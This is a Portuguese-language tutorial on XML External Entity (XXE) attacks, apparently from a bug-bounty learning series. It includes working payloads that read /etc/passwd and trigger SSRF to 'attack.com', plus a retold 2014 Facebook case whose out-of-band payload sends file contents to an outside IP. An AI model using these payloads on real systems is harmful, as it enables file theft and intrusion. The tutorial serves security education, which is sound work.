# XML External Entity

### Oque é:

Esta falha ocorre quando o atacante consegue manipular o conteúdo de um arquivo XML ao enviá-lo para o servidor, fazendo com que o mesmo processe o arquivo e execute um código malicioso, esta falha pode em alguns casos escalar para um total comprometimento dele, ela também pode ser usada junto a um server-side request forgery.

### XML:

Primeiro irei esclarecer o que é o eXtensible Markup Language, ele é uma linguagem de marcação usada para descrever e compartilhar diversos tipos de dados, para isso são usados tags como no HTML entretanto no XML elas não são predefinidas e todas dever ser fechadas.

O XML esta caindo em desuso para transporte de dados na internet devido a sua alta escalabilidade de tamanho, agora o modelo usado é o JSON.

Este é um exemplo de um documento xml:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!-- Na primeira linha é definido o tipo do arquivo sua versão e o encoding usado -->
<raiz><!-- Aqui definimos o elemento raiz, os aquivos xml podem conter somente um dele-->
<!-- Todas as tags dentro da raiz são suas filhas-->
<!-- Podem existir várias tags filhas com o mesmo nome -->
	<filho>
		<Nome>Thiago</Nome>
		<Idade>17</Idade>
	</filho>
	<filho>
		<Nome>Carlos</Nome>
		<Idade>23</Idade>
	</filho>
	<filho>
		<Nome>Claudia</Nome>
		<Idade>40</Idade>
	</filho>
</raiz><!-- Aqui fechamos raiz, tudo dentro dela é sua filha -->
```

Dentro do xml existe um o conceito de DTD, que é um Document Type Definition, eles são usados para descrever como o arquivo xml será, sua sintaxe é simples, veja:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!-- Usamos o DOCTYPE para declarar o inicio de um elemento raiz -->

<!DOCTYPE raiz [

    <!ELEMENT raiz (nome,telefone)>
	<!-- Dentro dele definimos seus elementos filhos usando a tag element -->
    <!ELEMENT nome (#PCDATA)>
    <!-- E definimos como os elementos filhos serão neste caso,texto --> 	
    <!ELEMENT telefone (#PCDATA)>
]>
<!-- Abaixo é feita a declaração deles -->
<raiz>
  <nome>Thiago</nome>
  <telefone>(011) 123-4567</telefone>
</raiz>
```

o exemplo acima é de um DTD interno mas eles também podem ser adquiridos externamente:
```xml

<?xml version="1.0" encoding="UTF-8" standalone="no" ?>
<!DOCTYPE endereço SYSTEM "endereço.dtd"><!--Usamos o comando SYSTEM para definir o caminho do arquivo -->
<endereço>
  <nome>Thiago</nome>
  <telefone>(011) 123-4567</telefone>
</endereço>
```

Para explorar esta falha também devemos entender o conceito de ```ENTITY``` que são basicamente variáveis que podem ser chamadas no arquivo xml, elas também podem se referir a valores internos e externos, sua sintaxe é muito simples simples:
```xml
<!ENTITY entity-name "entity-value">
```
Um exemplo dela é:

```xml

<?xml version="1.0" encoding="UTF-8" standalone="no" ?>
<!DOCTYPE foo [<!ENTITY nome "Thiago">] ><!--Aqui criamos uma variável chamada nome e guardamos dentro dela a string Thiago-->
<endereço>
  <nome>&nome;</nome><!--Aqui chamamos a variável nome-->
  <telefone>(011) 123-4567</telefone>
</endereço>
```

O código acima se referia a entity's internas, as externas são declaradas assim:

```xml

<?xml version="1.0" encoding="UTF-8" standalone="no" ?>
<!DOCTYPE foo [<!ENTITY nome SYSTEM "htpps://exemplo.com">] >
<endereço>
  <nome>&nome;</nome>
  <telefone>(011) 123-4567</telefone>
</endereço>
```

Sua sintaxe é idêntica à DTD externos.

### Funcionamento técnico:

Como você já deve ter imaginado o 'problema' desta falha está quando podemos setar DTD's e atrelar uma entity externa a ele, ao enviar um xml como este para uma página:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck><productId>381</productId></stockCheck>
```
o body da response conteria isto:
```
Quantidade de produtos para 381: 37
```

como pode ser percebido, o valor setado é refletido na response, logo podemos injetar um valor malicioso como este:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]><!-- Aqui setamos o que seria um DDT externo
e guardamos seu valor dentro da 'variável' xxe-->
<stockCheck><productId>&xxe;</productId></stockCheck><!-- Chamamos a 'variável' usando o &xxe;-->
```

a response nesse caso conteria o valor do arquivo ```/etc/passwd```.

Esse ataque também pode ser usado para gerar um SSRF, como citado acima, para isto basta substituir o valor do arquivo para um valor HTTP.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "https://attack.com"> ]>
<stockCheck><productId>&xxe;</productId></stockCheck>
```

Caso o valor não seja refletido na response, tente fazer como foi ensinado no artigo sobre [SSRF](Server%20Side%20Request%20Forgery.md), injete um site sob seu domínio e analise se a response chega ou não, caso chegue o mesmo é vulnerável a SSRF por XXE.

### Exemplo:

No final de 2013, Reginaldo Silva reportou uma falha do tipo xxe para o facebook e recebeu $30000, ela poderia facilmente ser escalada para uma falha do tipo remote code execution já que o atacante poderia ler os arquivos ```/etc/passwd```, ela foi corrigida logo em seguinte.

Sabendo disso, no meio de 2014, Mohamed decidiu ver se conseguiria hackear o facebook, ele acessou uma página de carreiras na qual o usuário poderia sertar uma arquivo docx, esta extensão foi uma junção do doc com o xml, ela foi feita para facilitar a abertura e manipulação de arquivos doc, caso queira é possível extrair um arquivo docx você encontrará algo parecido com isto:


![](https://www.devmedia.com.br/imagens/articles/233575/openxmlexe3.png)

Ao perceber que poderia injetar um arquivo docx, o pesquisador extraiu o mesmo e injetou no xml esta carga maliciosa:

```xml
<!DOCTYPE root [
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % dtd SYSTEM "http://197.37.102.90/ext.dtd">
%dtd;
%send;
]]>
```
como podem perceber o valor ```%dtd``` faz referência a um arquivo dtd externo, e ao chamá-lo é verificado uma entity como esta:

```xml
<!ENTITY send SYSTEM 'http://197.37.102.90/?FACEBOOK-HACKED%26file;'>
```
ao enviar este payload o pesquisador percebeu requests chegando em seu servidor python, logo o facebook estava vulnerável a xxe novamente.

A princípio o facebook não conseguiu reproduzir a falha, por isto Mohamed quase não recebeu o bounty, mas após algumas trocas de emails a rede social encontrou e corrigiu a falha.

O pesquisador recebeu $6300 por esta falha, o valor foi menor que o de 2013 pois lá era possível escalar a falha para um Remote Code Execution irei explicar RCE com XXE no próximo artigo.

### Como explorar:

Não há muitos segredos na exploração desta falha, esteja atento a arquivos XML que podem ser manipulados, caso os encontre e o valor seja refletido tente definir entitys externas para leitura de arquivos ou caso o não seja refletido tente injetar uma entity que faça referência a um servidor o qual você pode analisar a interação.
